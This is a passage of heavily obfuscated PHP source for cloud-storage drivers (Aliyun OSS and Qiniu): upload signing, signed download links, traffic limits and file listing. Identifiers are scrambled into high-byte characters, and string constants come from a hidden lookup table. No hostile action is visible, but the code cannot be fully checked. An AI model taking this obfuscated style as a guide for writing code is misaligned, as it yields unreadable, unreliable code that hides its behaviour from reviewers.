$f“‹Ğ‡Â®Ÿ =& $_SERVER[õëù©û]; if (!($Có¿Ş…õÙ = $this->getHost())) { return !1; } $A‚ğÂƒÆÁ = $this->trafficLimit($f“‹Ğ‡Â®Ÿ[1180]); $eØ‚ñ½…¼• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aŠÔÃ„ÑâŸ), $A‚ğÂƒÆÁ); return array($f“‹Ğ‡Â®Ÿ[205] => $eØ‚ñ½…¼•, $f“‹Ğ‡Â®Ÿ[165] => $Có¿Ş…õÙ . $f“‹Ğ‡Â®Ÿ[8] . $this->pathEncode($aŠÔÃ„ÑâŸ), $f“‹Ğ‡Â®Ÿ[206] => gmdate($f“‹Ğ‡Â®Ÿ[1188]), $f“‹Ğ‡Â®Ÿ[89] => $aŠÔÃ„ÑâŸ); } public function multiUploadAuthData($d©³©ÕŠÙ, $cÔ×‘ù¹„£ = array()) { goto aÌ™‰ÜÆ‰; aÌ™‰ÜÆ‰: $dÚ•×ŸÒ¤ =& $_SERVER[õëù©û]; $b°Ô‘²¡ë¨ = isset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[206]]) ? $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[206]] : gmdate($dÚ•×ŸÒ¤[1188]); $cÂÌÑİ½ˆ˜ = isset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[156]]) ? $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[156]] : $dÚ•×ŸÒ¤[33]; goto C‰÷“»Ûö; f˜ÈàµÕ—Ü: $a²½ÖÅÙê¨ = array($dÚ•×ŸÒ¤[208], $dÚ•×ŸÒ¤[33], $dÚ•×ŸÒ¤[115], $b°Ô‘²¡ë¨, "\x78\x2d\x6f\163\x73\55\144\x61\164\x65\72{$b°Ô‘²¡ë¨}", $dÚ•×ŸÒ¤[8] . $this->bucket . $dÚ•×ŸÒ¤[8] . $e£–ÆùÍÛ³ . $cÂÌÑİ½ˆ˜); if (strpos($cÂÌÑİ½ˆ˜, $dÚ•×ŸÒ¤[209]) === 0) { $a²½ÖÅÙê¨[0] = $dÚ•×ŸÒ¤[210]; if ($cÀ­ĞóÕòô = $this->trafficLimit($dÚ•×ŸÒ¤[1180])) { $e£–ÆùÍÛ³ = $dÚ•×ŸÒ¤[1189]; array_splice($a²½ÖÅÙê¨, 5, 0, $e£–ÆùÍÛ³ . $dÚ•×ŸÒ¤[4] . $cÀ­ĞóÕòô[$e£–ÆùÍÛ³]); } } if (isset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[211]]) && $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[211]] == $dÚ•×ŸÒ¤[212]) { $a²½ÖÅÙê¨[0] = $dÚ•×ŸÒ¤[212]; } goto f‰³“Ù˜Ğ—; f‰³“Ù˜Ğ—: if (!empty($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[1190]])) { $bãíŠÏÛ²ø = array_merge(array($a²½ÖÅÙê¨[4]), $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[1190]]); sort($bãíŠÏÛ²ø); $a²½ÖÅÙê¨[4] = implode($dÚ•×ŸÒ¤[213], $bãíŠÏÛ²ø); } $f‚ù‡«¯„½ = implode($dÚ•×ŸÒ¤[213], $a²½ÖÅÙê¨); $CÒåÎÓ = base64_encode(hash_hmac($dÚ•×ŸÒ¤[214], $f‚ù‡«¯„½, $this->secret, !0)); goto a§¾›İ©¿œ; a§¾›İ©¿œ: $EßŸ¨Äòã = $dÚ•×ŸÒ¤[1191] . $this->accessKey . $dÚ•×ŸÒ¤[4] . $CÒåÎÓ; if (strpos($cÂÌÑİ½ˆ˜, $dÚ•×ŸÒ¤[209]) === 0) { $EßŸ¨Äòã = array($dÚ•×ŸÒ¤[216] => $EßŸ¨Äòã, $dÚ•×ŸÒ¤[206] => $b°Ô‘²¡ë¨); if ($cÀ­ĞóÕòô) { $EßŸ¨Äòã = array_merge($EßŸ¨Äòã, $cÀ­ĞóÕòô); } } return $EßŸ¨Äòã; goto CŞ°Ğ±²ˆß; C‰÷“»Ûö: $e£–ÆùÍÛ³ = $d©³©ÕŠÙ; if (isset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[89]])) { $e£–ÆùÍÛ³ = $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[89]]; unset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[89]]); } if (isset($cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[207]])) { $cÔ×‘ù¹„£[$dÚ•×ŸÒ¤[206]] = $b°Ô‘²¡ë¨; return $this->listUploadParts($e£–ÆùÍÛ³, $cÔ×‘ù¹„£); } goto f˜ÈàµÕ—Ü; CŞ°Ğ±²ˆß: } public function listUploadParts($CÉ«ƒç©Ú, $F‘„ëÄÁ‰Â) { goto A‹ ê®×§å; A‹ ê®×§å: $aÅŒ´² ğ† =& $_SERVER[õëù©û]; $CÓîé³ô™ = parse_url_query($F‘„ëÄÁ‰Â[$aÅŒ´² ğ†[156]]); $Eµß„£¬ˆ  = $this->client->listParts($this->bucket, $this->pathEncode($CÉ«ƒç©Ú), $CÓîé³ô™[$aÅŒ´² ğ†[205]]); goto A‚àùù°®; A‚àùù°®: $dÚæß–ÌƒÓ = $Eµß„£¬ˆ ->getListPart(); $c…Å­ÁÊº‡ = array(); foreach ($dÚæß–ÌƒÓ as $A¤òåÙôÊ) { $c…Å­ÁÊº‡[] = array($aÅŒ´² ğ†[1171] => $A¤òåÙôÊ->getPartNumber(), $aÅŒ´² ğ†[1172] => trim($A¤òåÙôÊ->getETag(), $aÅŒ´² ğ†[112])); } goto cÚ©Òæô¯; cÚ©Òæô¯: unset($F‘„ëÄÁ‰Â[$aÅŒ´² ğ†[207]], $F‘„ëÄÁ‰Â[$aÅŒ´² ğ†[211]]); $C‹ÆˆæÇì = $this->multiUploadAuthData($CÉ«ƒç©Ú, $F‘„ëÄÁ‰Â); if (empty($C‹ÆˆæÇì)) { return !1; } goto Bê„…¬¤õ”; Bê„…¬¤õ”: return array($aÅŒ´² ğ†[216] => $C‹ÆˆæÇì, $aÅŒ´² ğ†[206] => $F‘„ëÄÁ‰Â[$aÅŒ´² ğ†[206]], $aÅŒ´² ğ†[218] => $c…Å­ÁÊº‡); goto cğ†Î´¤; cğ†Î´¤: } public function download($Eñƒ»´Á‚Š, $BŒ£ ­ë’˜) { if ($this->isFolder($Eñƒ»´Á‚Š)) { return !1; } try { $få °¢”ùÖ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BŒ£ ­ë’˜); $få °¢”ùÖ = $this->trafficLimit($_SERVER[õëù©û][104], $få °¢”ùÖ); $this->client->getObject($this->bucket, $this->pathEncode($Eñƒ»´Á‚Š), $få °¢”ùÖ); } catch (OSS\Core\OssException $FÄÂÒÜåÏŒ) { return !1; } return $BŒ£ ­ë’˜; } public function fileSubstr($cÕ‡Å—ùº, $EÊä³Ş ‘İ = 0, $E„®Àì«£Š = false) { if ($EÊä³Ş ‘İ === -1) { $AŠË³½™á… = array(); } else { if ($E„®Àì«£Š === !1) { $CçˆÀÖ‘Ê¹ = $this->size($cÕ‡Å—ùº); } else { $CçˆÀÖ‘Ê¹ = $EÊä³Ş ‘İ + $E„®Àì«£Š - 1; } $AŠË³½™á… = array(OSS\OssClient::OSS_RANGE => "{$EÊä³Ş ‘İ}\x2d{$CçˆÀÖ‘Ê¹}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cÕ‡Å—ùº), $AŠË³½™á…); } catch (OSS\Core\OssException $b¬Š¬Ö–¤ƒ) { think_exception($b¬Š¬Ö–¤ƒ->getMessage()); return !1; } } private function trafficLimit($Cáœ÷³‹»’, $E–’Ö–Á•“ = array()) { goto e¬ãïéğÑ°; fÒê‰±Ç¬•: if (!$D¨†ÏÖÜŸ) { return $E–’Ö–Á•“; } $D¨†ÏÖÜŸ = $D¨†ÏÖÜŸ < 819200 ? 819200 : ($D¨†ÏÖÜŸ > 838860800 ? 838860800 : $D¨†ÏÖÜŸ); $E–’Ö–Á•“[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($D¨†ÏÖÜŸ); goto AªêˆŠÀç; AªêˆŠÀç: return $E–’Ö–Á•“; goto EÀÜ‰Â¨·; e¬ãïéğÑ°: $f·‹Öï»‚´ =& $_SERVER[õëù©û]; if ($Cáœ÷³‹»’ == $f·‹Öï»‚´[1180] && $this->isUploadServer() || $Cáœ÷³‹»’ == $f·‹Öï»‚´[104] && $this->isFileOutServer()) { return $E–’Ö–Á•“; } $D¨†ÏÖÜŸ = floatval($GLOBALS[$f·‹Öï»‚´[6]][$f·‹Öï»‚´[84]][$f·‹Öï»‚´[102]][$Cáœ÷³‹»’]) * 1024 * 1024 * 8; goto fÒê‰±Ç¬•; EÀÜ‰Â¨·: } public function link($dä£„‘ô, $BÜƒ×—‡¡‹ = array()) { $E¤ŸÈ¨µƒ =& $_SERVER[õëù©û]; if (!$this->exist($dä£„‘ô) || $this->isFolder($dä£„‘ô)) { return !1; } try { $BÜƒ×—‡¡‹ = $this->trafficLimit($E¤ŸÈ¨µƒ[104], $BÜƒ×—‡¡‹); $E²¼Õòó£ = $this->client->signUrl($this->bucket, $this->pathEncode($dä£„‘ô), 3600 * 12, $E¤ŸÈ¨µƒ[212], $BÜƒ×—‡¡‹); return $this->getCdnLink($E²¼Õòó£); } catch (OSS\Core\OssException $Dæµå§‡) { return !1; } } public function fileOut($aâÌ‘Šƒ, $dÒ»÷¨œäÖ = false, $A¯ÄÅĞäŒµ = false, $aíÚöç„ô— = '') { goto eÚ£áÃ¬å; CË“°„•‹: $EºĞ¿ó•Ìš = array(OSS\OssClient::OSS_SUB_RESOURCE => $c¤î¡¹Ë§[1192] . rawurlencode("{$dÒ»÷¨œäÖ}\x3b\146\151\154\x65\x6e\141\155\145\75{$A¯ÄÅĞäŒµ}")); $EºĞ¿ó•Ìš[OSS\OssClient::OSS_SUB_RESOURCE] .= $c¤î¡¹Ë§[1193] . $dæÏŒñÇªˆ; $AÖ¬šî‰¤– = $this->link($aâÌ‘Šƒ, $EºĞ¿ó•Ìš); goto A¸îĞ•×ğ; BÂù²ë½: $dæÏŒñÇªˆ = get_file_mime(get_path_ext($A¯ÄÅĞäŒµ)); if ($dæÏŒñÇªˆ == $c¤î¡¹Ë§[197]) { return parent::fileOut($aâÌ‘Šƒ, $dÒ»÷¨œäÖ, $A¯ÄÅĞäŒµ, $aíÚöç„ô—); } $dÒ»÷¨œäÖ = $dÒ»÷¨œäÖ ? $c¤î¡¹Ë§[198] : $c¤î¡¹Ë§[199]; goto CË“°„•‹; eÚ£áÃ¬å: $c¤î¡¹Ë§ =& $_SERVER[õëù©û]; if (!$A¯ÄÅĞäŒµ) { $A¯ÄÅĞäŒµ = $this->pathThis($aâÌ‘Šƒ); } $A¯ÄÅĞäŒµ = rawurlencode($A¯ÄÅĞäŒµ); goto BÂù²ë½; A¸îĞ•×ğ: $this->fileOutLink($AÖ¬šî‰¤–); goto f—‘ÖÂÀ¿; f—‘ÖÂÀ¿: } public function fileOutServer($A§§à¢ÌÃ‡, $F‰„‹éÄˆ = false, $eØêÂƒÚæÉ = false, $a¯“¤Ìò© = '') { parent::fileOut($A§§à¢ÌÃ‡, $F‰„‹éÄˆ, $eØêÂƒÚæÉ, $a¯“¤Ìò©); } public function fileOutImage($e…›Õ¼¦¶œ, $fƒÊÀ×ÖŸ = 250) { $F¸ãÃ¢®„ì = array(OSS\OssClient::OSS_PROCESS => $_SERVER[õëù©û][1194] . $fƒÊÀ×ÖŸ); $f˜¥°­…ë = $this->link($e…›Õ¼¦¶œ, $F¸ãÃ¢®„ì); $this->fileOutLink($f˜¥°­…ë); } public function fileOutImageServer($dÁ¸µÙí, $c•˜²Š¦–é = 250) { parent::fileOutImage($dÁ¸µÙí, $c•˜²Š¦–é); } public function fileOutLink($F¤îäâñé) { $fğË¸“Ğå— =& $_SERVER[õëù©û]; if (!$this->isCdnHost() && substr($F¤îäâñé, 0, 7) == $fğË¸“Ğå—[1099]) { $F¤îäâñé = $fğË¸“Ğå—[1100] . substr($F¤îäâñé, 7); } header($fğË¸“Ğå—[152] . $F¤îäâñé); die; } public function hashMd5($EµÑËù†”, $Dé„¯½‰‰ = '') { $eÈ¼§Õ¹Á† =& $_SERVER[õëù©û]; $bÌåŠÒš“Ü = $this->objectMeta($EµÑËù†”); if (!$bÌåŠÒš“Ü) { return $eÈ¼§Õ¹Á†[33]; } if (!isset($bÌåŠÒš“Ü[$eÈ¼§Õ¹Á†[1167]]) && !empty($Dé„¯½‰‰)) { $eÉŠì‰Œ = $this->updateObjMeta($EµÑËù†”, array($eÈ¼§Õ¹Á†[1167] => $Dé„¯½‰‰)); $bÌåŠÒš“Ü[$eÈ¼§Õ¹Á†[1167]] = $eÉŠì‰Œ ? $Dé„¯½‰‰ : $eÈ¼§Õ¹Á†[33]; } return isset($bÌåŠÒš“Ü[$eÈ¼§Õ¹Á†[1167]]) ? strtolower($bÌåŠÒš“Ü[$eÈ¼§Õ¹Á†[1167]]) : $eÈ¼§Õ¹Á†[33]; } public function size($a¢ù’ªùå‹) { $AÈä·¤×ïÎ = $this->objectMeta($a¢ù’ªùå‹); return $AÈä·¤×ïÎ ? $AÈä·¤×ïÎ[$_SERVER[õëù©û][77]] : 0; } public function info($B¤±šùŒæ) { if ($this->isFolder($B¤±šùŒæ)) { return $this->folderInfo($B¤±šùŒæ); } else { if ($this->isFile($B¤±šùŒæ)) { return $this->fileInfo($B¤±šùŒæ); } } return !1; } public function exist($aËŞƒßŒ›õ) { return $this->isFile($aËŞƒßŒ›õ) || $this->isFolder($aËŞƒßŒ›õ); } public function isFile($B‹Š¾‚‘) { return !$this->isFolder($B‹Š¾‚‘) && $this->objectMeta($B‹Š¾‚‘); } public function isFolder($D‡»”ÌÜåµ) { return $this->cacheMethod($_SERVER[õëù©û][219], $D‡»”ÌÜåµ); } protected function objectMeta($c¢èÓï‚Œƒ) { return $this->cacheMethod($_SERVER[õëù©û][220], $c¢èÓï‚Œƒ); } protected function _objectMeta($eÉ¯¢¾î„°) { $eÄ½èî§› =& $_SERVER[õëù©û]; try { $f¯‡òºÓ£Ô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eÉ¯¢¾î„°)); } catch (OSS\Core\OssException $B«°ã»°Ğ°) { $f¯‡òºÓ£Ô = !1; } if ($f¯‡òºÓ£Ô) { $f¯‡òºÓ£Ô[$eÄ½èî§›[77]] = intval($f¯‡òºÓ£Ô[$eÄ½èî§›[1174]]); } return $f¯‡òºÓ£Ô; } protected function _isFolder($fîç‹šÉ´Ñ) { $cÇàÖ—æ =& $_SERVER[õëù©û]; if ($fîç‹šÉ´Ñ == $cÇàÖ—æ[33] || $fîç‹šÉ´Ñ == $cÇàÖ—æ[8]) { return !0; } $A‹ÀÜİÈÊ‚ = array($cÇàÖ—æ[1164] => $cÇàÖ—æ[8], $cÇàÖ—æ[182] => rtrim($fîç‹šÉ´Ñ, $cÇàÖ—æ[8]) . $cÇàÖ—æ[8], $cÇàÖ—æ[1165] => 1, $cÇàÖ—æ[1166] => $cÇàÖ—æ[33]); $C…•ä¡¶¢Å = $this->client->listObjects($this->bucket, $A‹ÀÜİÈÊ‚); if ($C…•ä¡¶¢Å->getObjectList() || $C…•ä¡¶¢Å->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Fé„ßŒ—š–) { parent::__construct(); require_once SDK_DIR . $_SERVER[õëù©û][1195]; $this->_init($Fé„ßŒ—š–); } public function _init($cïÑéñÇ) { foreach ($cïÑéñÇ as $DŒ¿„™ ¹½ => $EÙ«òÄè˜Ô) { if (isset($this->{$DŒ¿„™ ¹½})) { $this->{$DŒ¿„™ ¹½} = $EÙ«òÄè˜Ô; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[õëù©û][1196], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BäêŠÃğ¤¤, $cÛà¹ê…´Ä = '', $B¤Õéà¿Ö• = REPEAT_RENAME) { if ($this->setContent($BäêŠÃğ¤¤, $cÛà¹ê…´Ä)) { return $this->getPathOuter($BäêŠÃğ¤¤); } return !1; } public function mkdir($E·ŠÌä˜®ò, $f†Ö‡åôÔ = REPEAT_SKIP) { goto fÔªšˆ˜ã; aö¹˜´Ù˜: if (!$this->mkfile($d£íï—›Â)) { return !1; } if (!$this->moveFile($d£íï—›Â, $E·ŠÌä˜®ò)) { $this->delFile($d£íï—›Â); return !1; } return $this->getPathOuter($C÷ÔàŸÊÅÑ); goto Aèé‰èÀ; fÔªšˆ˜ã: $b–©ƒùÃ¿ =& $_SERVER[õëù©û]; $C÷ÔàŸÊÅÑ = trim($E·ŠÌä˜®ò, $b–©ƒùÃ¿[8]); if ($this->_isFolder($C÷ÔàŸÊÅÑ)) { return $this->getPathOuter($C÷ÔàŸÊÅÑ); } goto EŒÖÕ„×–‚; EŒÖÕ„×–‚: $E·ŠÌä˜®ò = $C÷ÔàŸÊÅÑ . $b–©ƒùÃ¿[8]; $fÖ©İæ¦Û = get_path_this($C÷ÔàŸÊÅÑ); $d£íï—›Â = $E·ŠÌä˜®ò . $fÖ©İæ¦Û; goto aö¹˜´Ù˜; Aèé‰èÀ: } public function copyFile($eöæƒÅéô, $DÊ¯¶àï) { $f¹ĞïñğÍ = $this->bucketManager->copy($this->bucket, $eöæƒÅéô, $this->bucket, $DÊ¯¶àï, !0); return $f¹ĞïñğÍ ? !1 : !0; } public function moveFile($fÇõ‰Ùˆ‘î, $FÏä°†³¾…) { $cÊœŞ•¢İï = $this->bucketManager->move($this->bucket, $fÇõ‰Ùˆ‘î, $this->bucket, $FÏä°†³¾…, !0); return $cÊœŞ•¢İï ? !1 : !0; } public function delFile($AÕ”Åèèßö) { $b–ŒË½ªÃã = $this->bucketManager->delete($this->bucket, $AÕ”Åèèßö); return $b–ŒË½ªÃã ? !1 : !0; } public function delFolder($a²…àÆ‹’‘) { $FÖÀÆà¸Ó = $this->fileList($a²…àÆ‹’‘); if (empty($FÖÀÆà¸Ó)) { return !0; } $E•ç ¦ŞÔ = 1000; if (count($FÖÀÆà¸Ó) <= $E•ç ¦ŞÔ) { return $this->qnDelObj($FÖÀÆà¸Ó) ? !1 : !0; } foreach (array_chunk($FÖÀÆà¸Ó, $E•ç ¦ŞÔ) as $E¢ˆ²¬—£ó) { $FœãÔÔÇÀ = $this->qnDelObj($E¢ˆ²¬—£ó); if ($FœãÔÔÇÀ) { return !1; } } return !0; } private function qnDelObj($fÓ‹‚ò­‰¹) { $Fˆçø»Áˆ× = $this->bucketManager->buildBatchDelete($this->bucket, $fÓ‹‚ò­‰¹); list($aäØŒŸÃ‰, $d†É†ˆŠÖ‘) = $this->bucketManager->batch($Fˆçø»Áˆ×); return $d†É†ˆŠÖ‘; } private function fileList($dõÙ…Èäòƒ, $AÁÜĞ’¨Ãê = 0) { goto bÅò¬äÙá; fç˜ô¾Æêï: $cÕÆ´‡‡Ìİ = array(); while (!0) { list($bÁôª ßÊ, $c°Î¢”Îéæ) = $this->bucketManager->listFiles($this->bucket, $cÒó„©İÓê, $FÎ†ØÓ¶Š‘, $AöÂÙöõ¹Ô, $B„Ú¿ñêº›); if ($c°Î¢”Îéæ) { return !1; } $FÎ†ØÓ¶Š‘ = array_key_exists($bÛêêÖÈã[1166], $bÁôª ßÊ) ? $FÎ†ØÓ¶Š‘ = $bÁôª ßÊ[$bÛêêÖÈã[1197]] : $bÛêêÖÈã[33]; foreach ($bÁôª ßÊ[$bÛêêÖÈã[1198]] as $BáîÖØ«õÌ) { $D¯êÒ¸ìØ = $BáîÖØ«õÌ[$bÛêêÖÈã[89]]; if ($AÁÜĞ’¨Ãê) { $D¯êÒ¸ìØ = array($bÛêêÖÈã[28] => $D¯êÒ¸ìØ, $bÛêêÖÈã[77] => $BáîÖØ«õÌ[$bÛêêÖÈã[1199]]); } $cÕÆ´‡‡Ìİ[] = $D¯êÒ¸ìØ; } if ($FÎ†ØÓ¶Š‘ == $bÛêêÖÈã[33]) { break; } } return $cÕÆ´‡‡Ìİ; goto dãŠ¬ñ‘ƒÊ; bÅò¬äÙá: $bÛêêÖÈã =& $_SERVER[õëù©û]; $dõÙ…Èäòƒ = trim($dõÙ…Èäòƒ, $bÛêêÖÈã[8]); $cÒó„©İÓê = empty($dõÙ…Èäòƒ) ? $bÛêêÖÈã[33] : $dõÙ…Èäòƒ . $bÛêêÖÈã[8]; goto a†ÂèĞ“ ; a†ÂèĞ“ : $FÎ†ØÓ¶Š‘ = $bÛêêÖÈã[33]; $AöÂÙöõ¹Ô = 1000; $B„Ú¿ñêº› = $bÛêêÖÈã[33]; goto fç˜ô¾Æêï; dãŠ¬ñ‘ƒÊ: } public function rename($a‘ò…½ ¥Å, $AÓ¦Û®Ş‡) { return $this->renameObject($a‘ò…½ ¥Å, $AÓ¦Û®Ş‡); } public function fileInfo($AÕç†™‚ÔÄ, $C¦ºÜ•¥ = false, $Bê”£ÆäĞÆ = array()) { goto dñ­Ø°É ; dñ­Ø°É : $cÅïïÍ«ÁÈ =& $_SERVER[õëù©û]; if ($C¦ºÜ•¥) { return array($cÅïïÍ«ÁÈ[28] => $this->pathThis($AÕç†™‚ÔÄ), $cÅïïÍ«ÁÈ[75] => $this->getPathOuter($cÅïïÍ«ÁÈ[8] . $AÕç†™‚ÔÄ), $cÅïïÍ«ÁÈ[29] => $cÅïïÍ«ÁÈ[163], $cÅïïÍ«ÁÈ[77] => isset($Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1199]]) ? $Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1199]] : 0, $cÅïïÍ«ÁÈ[156] => $this->ext($AÕç†™‚ÔÄ)); } $e®ß„êÙƒİ = array($cÅïïÍ«ÁÈ[28] => $this->pathThis($AÕç†™‚ÔÄ), $cÅïïÍ«ÁÈ[75] => $this->getPathOuter($cÅïïÍ«ÁÈ[8] . $AÕç†™‚ÔÄ), $cÅïïÍ«ÁÈ[29] => $cÅïïÍ«ÁÈ[163], $cÅïïÍ«ÁÈ[183] => 0, $cÅïïÍ«ÁÈ[106] => 0, $cÅïïÍ«ÁÈ[77] => 0, $cÅïïÍ«ÁÈ[156] => $this->ext($AÕç†™‚ÔÄ), $cÅïïÍ«ÁÈ[184] => !0, $cÅïïÍ«ÁÈ[185] => !0); goto B¶»Óƒœ‘Š; B¶»Óƒœ‘Š: if (empty($Bê”£ÆäĞÆ)) { $Bê”£ÆäĞÆ = $this->objectMeta($AÕç†™‚ÔÄ); if (!$Bê”£ÆäĞÆ) { return $e®ß„êÙƒİ; } } if (isset($Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1200]])) { $e®ß„êÙƒİ[$cÅïïÍ«ÁÈ[183]] = $Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1200]]; } if (isset($Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1199]])) { $e®ß„êÙƒİ[$cÅïïÍ«ÁÈ[77]] = $Bê”£ÆäĞÆ[$cÅïïÍ«ÁÈ[1199]]; } goto D˜Ñè®õéµ; D˜Ñè®õéµ: return $e®ß„êÙƒİ; goto A¤½òŞñÑ; A¤½òŞñÑ: } public function folderInfo($d„ØÛ•º¯«, $AÁ—ù¾›ì = false) { goto AÅ…ÌÀäíì; f¹ù‘›£õå: return $c˜”¯Ùµ¢; goto D¤±àÑ«»; a‡áß¯œã¹: $d„ØÛ•º¯« = rtrim($d„ØÛ•º¯«, $CîÔ²–¨õâ[8]) . $CîÔ²–¨õâ[8]; $e›ñˆšÅ¸Î = $this->objectMeta($d„ØÛ•º¯«); if (isset($e›ñˆšÅ¸Î[$CîÔ²–¨õâ[1200]])) { $c˜”¯Ùµ¢[$CîÔ²–¨õâ[183]] = $e›ñˆšÅ¸Î[$CîÔ²–¨õâ[1200]]; } goto f¹ù‘›£õå; AÅ…ÌÀäíì: $CîÔ²–¨õâ =& $_SERVER[õëù©û]; if ($AÁ—ù¾›ì) { return array($CîÔ²–¨õâ[28] => $this->pathThis($d„ØÛ•º¯«), $CîÔ²–¨õâ[75] => $this->getPathOuter($CîÔ²–¨õâ[8] . $d„ØÛ•º¯«), $CîÔ²–¨õâ[29] => $CîÔ²–¨õâ[76]); } $c˜”¯Ùµ¢ = array($CîÔ²–¨õâ[28] => $this->pathThis($d„ØÛ•º¯«), $CîÔ²–¨õâ[75] => $this->getPathOuter($CîÔ²–¨õâ[8] . $d„ØÛ•º¯«), $CîÔ²–¨õâ[29] => $CîÔ²–¨õâ[76], $CîÔ²–¨õâ[183] => 0, $CîÔ²–¨õâ[106] => 0, $CîÔ²–¨õâ[1145] => !0, $CîÔ²–¨õâ[1146] => !0); goto a‡áß¯œã¹; D¤±àÑ«»: } public function listPath($bä“§ÄñíÊ, $F°ïÚ “Ó† = false) { goto A§ç­Éœô×; d×Ó”Áƒ¡Ò: $C’ñ„Óä = $aÍ‚Ø•„´Ù[33]; $AÑÆÎëæÇ• = 1000; $AÆ”¢åğ = $aÍ‚Ø•„´Ù[8]; goto d¶Ğ‘´’‰Ê; d¶Ğ‘´’‰Ê: $EÙßœÀÛö§ = $d¢›ù†êÜÚ = array(); while (!0) { list($AŞêÏò¾, $AĞ°šò—¼) = $this->bucketManager->listFiles($this->bucket, $bé–Ãö”», $C’ñ„Óä, $AÑÆÎëæÇ•, $AÆ”¢åğ); if ($AĞ°šò—¼) { return !1; } $C’ñ„Óä = array_key_exists($aÍ‚Ø•„´Ù[1166], $AŞêÏò¾) ? $C’ñ„Óä = $AŞêÏò¾[$aÍ‚Ø•„´Ù[1197]] : $aÍ‚Ø•„´Ù[33]; if (isset($AŞêÏò¾[$aÍ‚Ø•„´Ù[1201]])) { foreach ($AŞêÏò¾[$aÍ‚Ø•„´Ù[1201]] as $Eˆ‰“çĞÚÕ) { if ($Eˆ‰“çĞÚÕ == $bé–Ãö”») { continue; } $EÙßœÀÛö§[] = $this->folderInfo($Eˆ‰“çĞÚÕ, $F°ïÚ “Ó†); } } if (isset($AŞêÏò¾[$aÍ‚Ø•„´Ù[1198]])) { foreach ($AŞêÏò¾[$aÍ‚Ø•„´Ù[1198]] as $DŞƒ»×¼¿Ê) { if ($DŞƒ»×¼¿Ê[$aÍ‚Ø•„´Ù[89]] == $bé–Ãö”») { continue; } $d¢›ù†êÜÚ[] = $this->fileInfo($DŞƒ»×¼¿Ê[$aÍ‚Ø•„´Ù[89]], $F°ïÚ “Ó†, $DŞƒ»×¼¿Ê); } } if ($C’ñ„Óä == $aÍ‚Ø•„´Ù[33]) { break; } } return array($aÍ‚Ø•„´Ù[74] => $EÙßœÀÛö§, $aÍ‚Ø•„´Ù[73] => $d¢›ù†êÜÚ); goto a¹ÚòœŒ¸; A§ç­Éœô×: $aÍ‚Ø•„´Ù =& $_SERVER[õëù©û]; $bä“§ÄñíÊ = trim($bä“§ÄñíÊ, $aÍ‚Ø•„´Ù[8]); $bé–Ãö”» = empty($bä“§ÄñíÊ) ? $aÍ‚Ø•„´Ù[33] : $bä“§ÄñíÊ . $aÍ‚Ø•„´Ù[8]; goto d×Ó”Áƒ¡Ò; a¹ÚòœŒ¸: } public function has($D‚‰âÕÙ, $fœ‚öá“¿å = false, $aÒˆËí×šë = true) { goto d±ÁŒÒÉèˆ; e½Úº‹‚ä: $e›ßÉã¸ô = $eæ‡‡ÑØ¯ª[33]; $AæàÍ‡Ğ = 1000; $e®ÔµÔ”á = $eæ‡‡ÑØ¯ª[8]; goto A¼ŸøŸ™Ü¿; A¼ŸøŸ™Ü¿: $DÁƒ­Á³ù‘ = 0; $FêÜò½š ± = 0; while (!0) { list($bºŸ£ã·«, $F¼á´óÑ‘ï) = $this->bucketManager->listFiles($this->bucket, $a’ÏÁ¾Àµê, $e›ßÉã¸ô, $AæàÍ‡Ğ, $e®ÔµÔ”á); if ($F¼á´óÑ‘ï) { return !1; } $e›ßÉã¸ô = array_key_exists($eæ‡‡ÑØ¯ª[1166], $bºŸ£ã·«) ? $e›ßÉã¸ô = $bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1197]] : $eæ‡‡ÑØ¯ª[33]; if ($fœ‚öá“¿å) { if (!empty($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1198]])) { $DÁƒ­Á³ù‘ += count($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1198]]); } if (!empty($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1201]])) { $FêÜò½š ± += count($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1201]]); } if ($e›ßÉã¸ô === $eæ‡‡ÑØ¯ª[33]) { break; } continue; } if ($aÒˆËí×šë) { if (!empty($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1198]])) { return !0; } } else { if (!empty($bºŸ£ã·«[$eæ‡‡ÑØ¯ª[1201]])) { return !0; } } if ($e›ßÉã¸ô == $eæ‡‡ÑØ¯ª[33]) { break; } } goto Dª¹Öï¥ß; Dª¹Öï¥ß: if ($fœ‚öá“¿å) { return array($eæ‡‡ÑØ¯ª[187] => $DÁƒ­Á³ù‘, $eæ‡‡ÑØ¯ª[188] => $FêÜò½š ±); } return !1; goto 